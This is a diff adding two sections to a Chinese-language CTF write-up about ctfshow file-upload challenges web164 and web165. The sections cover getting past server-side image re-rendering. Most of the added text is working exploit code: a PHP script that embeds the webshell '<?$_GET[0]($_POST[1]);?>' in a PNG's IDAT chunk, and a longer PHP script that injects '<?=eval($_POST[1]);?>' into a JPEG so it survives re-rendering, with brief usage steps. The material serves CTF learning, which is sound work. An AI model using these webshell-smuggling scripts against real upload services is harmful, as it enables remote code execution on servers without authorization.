@@ -159,3 +159,204 @@ nothing here？说明此处有个php页面，那么这个题考察的就是.user
 思路同上，但是上传的文件会被服务器立刻删掉，原预期解是通过竞争的方式，但是现在不行，所以就包含在配置文件里![image-20220117194817052](image/ctfshow-文件上传(151-170)/image-20220117194817052.png)![image-20220117194835364](image/ctfshow-文件上传(151-170)/image-20220117194835364.png)
 
 值得注意的是这个题文件不会覆盖，所以只能包含一次，如果写错文件那么就要重开环境了hhh，而且162和163这种做法都要求服务器支持远程文件包含，如果服务器没开启这个选项的话那么就没办法这样做了
+
+## web164(png二次渲染绕过)
+
+访问upload目录发现没有index.php了，且只能上传图片，考虑png二次渲染绕过
+
+大概思路是服务端会对客户端上传的文件内容进行二次渲染，比方说我在文件尾加入了一句话木马，但是上传后服务端会进行二次渲染，就将这句木马过滤掉了，绕过的姿势就是找到二次渲染前后文件内容没有变化的位置，将php一句话写入这个位置就可以绕过二次渲染
+
+```php
+<?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y < sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+
+imagepng($img,'2.png');  //要修改的图片的路径
+/* 木马内容
+<?$_GET[0]($_POST[1]);?>
+ */
+
+?>
+```
+
+借大牛的脚本一用，运行脚本后会生成一个png图片，它符合png图片规范，将绕过二次渲染的一句话木马写入了IDAT数据块
+
+上传图片后执行命令即可
+
+![image-20220119133312983](image/ctfshow-文件上传(151-170)/image-20220119133312983.png)
+
+## web165(jpg二次渲染绕过)
+
+原理和png二次渲染绕过差不多，采用网上大牛的脚本
+
+```php
+<!-- 用法 php exp.php a.jpg -->
+<?php
+    $miniPayload = "<?=eval(\$_POST[1]);?>";
+
+    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+        die('php-gd is not installed');
+    }
+
+    if(!isset($argv[1])) {
+        die('php jpg_payload.php <jpg_name.jpg>');
+    }
+
+    set_error_handler("custom_error_handler");
+
+    for($pad = 0; $pad < 1024; $pad++) {
+        $nullbytePayloadSize = $pad;
+        $dis = new DataInputStream($argv[1]);
+        $outStream = file_get_contents($argv[1]);
+        $extraBytes = 0;
+        $correctImage = TRUE;
+
+        if($dis->readShort() != 0xFFD8) {
+            die('Incorrect SOI marker');
+        }
+
+        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
+            $marker = $dis->readByte();
+            $size = $dis->readShort() - 2;
+            $dis->skip($size);
+            if($marker === 0xDA) {
+                $startPos = $dis->seek();
+                $outStreamTmp = 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat("\0",$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !== 0) {
+                    while((!$dis->eof())) {
+                        if($dis->readByte() === 0xFF) {
+                            if($dis->readByte !== 0x00) {
+                                break;
+                            }
+                        }
+                    }
+                    $stopPos = $dis->seek() - 2;
+                    $imageStreamSize = $stopPos - $startPos;
+                    $outStream = 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat("\0",$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                } elseif($correctImage) {
+                    $outStream = $outStreamTmp;
+                } else {
+                    break;
+                }
+                if(checkImage('payload_'.$argv[1], $outStream)) {
+                    die('Success!');
+                } else {
+                	echo "error";
+                    break;
+                }
+            }
+        }
+    }
+    unlink('payload_'.$argv[1]);
+    die('Something\'s wrong');
+
+    function checkImage($filename, $data, $unlink = FALSE) {
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage = TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    }
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) {
+        global $extraBytes, $correctImage;
+        $correctImage = FALSE;
+        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+            if(isset($m[1])) {
+                $extraBytes = (int)$m[1];
+            }
+        }
+    }
+
+    class DataInputStream {
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order = false, $fromString = false) {
+            $this->binData = '';
+            $this->order = $order;
+            if(!$fromString) {
+                if(!file_exists($filename) || !is_file($filename))
+                    die('File not exists ['.$filename.']');
+                $this->binData = file_get_contents($filename);
+            } else {
+                $this->binData = $filename;
+            }
+            $this->size = strlen($this->binData);
+        }
+
+        public function seek() {
+            return ($this->size - strlen($this->binData));
+        }
+
+        public function skip($skip) {
+            $this->binData = substr($this->binData, $skip);
+        }
+
+        public function readByte() {
+            if($this->eof()) {
+                die('End Of File');
+            }
+            $byte = substr($this->binData, 0, 1);
+            $this->binData = substr($this->binData, 1);
+            return ord($byte);
+        }
+
+        public function readShort() {
+            if(strlen($this->binData) < 2) {
+                die('End Of File');
+            }
+            $short = substr($this->binData, 0, 2);
+            $this->binData = substr($this->binData, 2);
+            if($this->order) {
+                $short = (ord($short[1]) << 8) + ord($short[0]);
+            } else {
+                $short = (ord($short[0]) << 8) + ord($short[1]);
+            }
+            return $short;
+        }
+
+        public function eof() {
+            return !$this->binData||(strlen($this->binData) === 0);
+        }
+    }
+?>
+```
+
+这里用某些jpg图片进行渲染成功率不高，这里采用热心群友的图片
+
+![image-jpg二次渲染专用](image/ctfshow-文件上传(151-170)/jpg二次渲染专用.jpg)**先将这个图片上传到服务器进行一次渲染，然后将文件下载到本地，使用脚本处理后再进行上传**
+
+![image-20220119142634515](image/ctfshow-文件上传(151-170)/image-20220119142634515.png)
